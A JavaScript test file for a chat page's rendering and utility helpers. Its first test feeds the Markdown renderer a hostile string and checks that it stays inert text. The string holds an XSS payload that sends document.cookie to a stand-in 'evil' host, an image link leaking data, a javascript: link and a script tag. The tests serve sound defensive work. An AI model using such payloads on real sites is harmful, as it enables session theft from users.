// Tests for the conversation page's pure helpers. Run with: node --test internal/api/uitest
import { test } from "node:test";
import assert from "node:assert/strict";
import { blocks, inline, toolWords, merge, open, suggest, countdown } from "../ui/text.js";

const flat = (bs) => JSON.stringify(bs);

test("HTML and images in a reply stay literal text", () => {
  const hostile = 'Look <img src=x onerror="fetch(\'//evil/\'+document.cookie)"> and ![x](http://evil.example/p.png?d=secret) and [click](javascript:alert(1)) <script>alert(1)</script>';
  const out = blocks(hostile);
  assert.equal(out.length, 1);
  assert.equal(out[0].type, "p");
  const text = out[0].spans.map((s) => s.text).join("");
  assert.equal(text, hostile.replace(/\*\*/g, ""));
  for (const s of out[0].spans) assert.ok(["text", "strong", "em", "code"].includes(s.type), "unexpected span " + s.type);
  assert.ok(!flat(out).includes('"type":"img"') && !flat(out).includes('"href"'));
});

test("supported Markdown becomes plain data", () => {
  const out = blocks("Hello **there** and `code`\n\n- one\n- two *x*\n\n1. first\n2. second\n\n```\nraw <b>\n```");
  assert.deepEqual(out.map((b) => b.type), ["p", "ul", "ol", "code"]);
  assert.deepEqual(out[0].spans, [{ type: "text", text: "Hello " }, { type: "strong", text: "there" }, { type: "text", text: " and " }, { type: "code", text: "code" }]);
  assert.equal(out[1].items.length, 2);
  assert.equal(out[3].text, "raw <b>");
});

test("inline keeps unmatched markers as text", () => {
  assert.deepEqual(inline("2 * 3 * 4 and a_b_c"), [{ type: "text", text: "2 * 3 * 4 and a" }, { type: "em", text: "b" }, { type: "text", text: "c" }]);
});

test("tool calls read as plain words", () => {
  assert.equal(toolWords("get_assignment"), "Reading a project…");
  assert.equal(toolWords("slack__post_message"), "Using slack: post message…");
});

test("a stored message replaces its optimistic copy once", () => {
  let list = merge([], { id: "local-1", local: true, client_msg_id: "c1", body: { text: "hi" } });
  list = merge(list, { id: "msg_1", seq: 1, client_msg_id: "c1", body: { text: "hi" } });
  list = merge(list, { id: "msg_1", seq: 1, client_msg_id: "c1", body: { text: "hi" } });
  assert.deepEqual(list.map((m) => m.id), ["msg_1"]);
});

test("a card decided elsewhere is no longer open", () => {
  assert.equal(open({ kind: "approval", status: "pending" }), true);
  assert.equal(open({ kind: "approval", status: "approved" }), false);
  assert.equal(open({ kind: "question", status: "open" }), true);
  assert.equal(open({ kind: "notification", status: "pending" }), false);
});

test("slash suggestions and countdowns", () => {
  assert.deepEqual(suggest("/ap"), ["/approve"]);
  assert.deepEqual(suggest("hello"), []);
  assert.equal(countdown(new Date(1000 + 90 * 60000), 1000), "1h 30m left");
  assert.equal(countdown(new Date(Date.now() - 1000)), "expired");
});
